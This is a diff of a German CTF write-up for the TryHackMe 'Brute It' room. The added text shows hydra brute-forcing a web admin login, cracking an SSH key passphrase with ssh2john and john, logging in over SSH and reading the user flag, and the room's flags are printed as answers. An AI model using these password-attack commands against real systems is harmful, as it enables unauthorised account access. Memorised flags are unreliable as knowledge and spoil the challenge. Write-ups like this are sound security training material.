@@ -93,17 +93,80 @@ Um eine SSH-Verbindung zu bekommen, macht es (gerade in einem Raum, der Brute It
 Da das versteckte Verzeichnis auf dem Webserver /admin heißt, nutze ich hier admin als Username.
 Der Hinweis im Source-Code bestätigt meine Vermutung:
 ![Image](/img/Brute-It-Screenshot-03.png)
+
 Die richtige Syntax für den hydra Befehl ziehe ich mir aus der Netzwerkanalyse meines Browsers:
 
 ![Image](/img/Brute-It-Screenshot-02.png)
 
 ````
+❯ hydra -l admin -P ~/rockyou.txt 10.10.201.149 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-23 12:53:35
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.201.149:80/admin/:user=^USER^&pass=^PASS^:Username or password invalid
+[80][http-post-form] host: 10.10.201.149   login: admin   password: xavier
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-23 12:53:48
 ````
 
 Wenn ich an CTFs arbeite, bei welchen ich einen Usernamen habe, lasse ich eigentlich immer, quasi nebenher, ein Terminal mit hydra gegen SSH und/oder FTP laufen, um nach einer funktionierenden Kombination aus Unsername und Passwort zu suchen.
 Als wordlist nutze ich hier meistens rockyou.txt, da diese seit einer gefühlten Ewigkeit mit Kali-Linux mitgeliefert wird und bei CTFs eigentlich der Standard gilt: Wenn du es mit rockyou nicht innerhalb von 5 Minuten cracken kannst, ist es nicht dafür gedacht gebruteforced zu werden.
 
+Frage 1 und 4 sind somit beantwortet. Im Adminpanel kann man einen RSA-Key herunterladen, welchen man dann mit ssh2john und john cracken kann.
+
+````~/tools/john/run/ssh2john.py RSA_key > hash.txt````
+
+````john --wordlist=../../rockyou.txt hash.txt````
+
+Somit haben wir auch das Passwort für den User john. id_rsa muss noch private Berechtigungen erhalten, damit sie verwendet werden kann: ````chmod 600 id_rsa```` und los geht's über SSH.
+
+````ssh john@10.10.201.149 -i id_rsa````
+
+Und schon liegt die Antwort auf die letzte Frage dieses Tasks direkt vor meinen Füßen:
+
+````
+❯ ssh john@10.10.201.149 -i id_rsa
+The authenticity of host '10.10.201.149 (10.10.201.149)' can't be established.
+ECDSA key fingerprint is SHA256:6/bVnMDQ46C+aRgroR5KUwqKM6J9jAfSYFMQIOKckug.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.201.149' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Nov 23 12:34:58 UTC 2020
+
+  System load:  0.0                Processes:           104
+  Usage of /:   25.7% of 19.56GB   Users logged in:     0
+  Memory usage: 21%                IP address for eth0: 10.10.201.149
+  Swap usage:   0%
+
+
+63 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
+john@bruteit:~$ ll
+total 40
+drwxr-xr-x 5 john john 4096 Sep 30 14:11 ./
+drwxr-xr-x 4 root root 4096 Aug 28 14:47 ../
+-rw------- 1 john john  394 Sep 30 14:11 .bash_history
+-rw-r--r-- 1 john john  220 Aug 16 18:14 .bash_logout
+-rw-r--r-- 1 john john 3771 Aug 16 18:14 .bashrc
+drwx------ 2 john john 4096 Aug 16 20:25 .cache/
+drwx------ 3 john john 4096 Aug 16 20:25 .gnupg/
+-rw-r--r-- 1 john john  807 Aug 16 18:14 .profile
+drwx------ 2 john john 4096 Aug 16 20:25 .ssh/
+-rw-r--r-- 1 john john    0 Aug 16 19:04 .sudo_as_admin_successful
+-rw-r--r-- 1 root root   33 Aug 16 18:56 user.txt
+john@bruteit:~$ cat user.txt 
+THM{a_password_is_not_a_barrier}
+````
 
 Question 1: What is the user:password of the admin panel?
 
@@ -120,3 +183,7 @@ Answer: THM{a_password_is_not_a_barrier}
 Question 4: Web flag
 
 Answer: THM{brut3_f0rce_is_e4sy}
+
+## Task 4 - Privilege Escalation
+
+
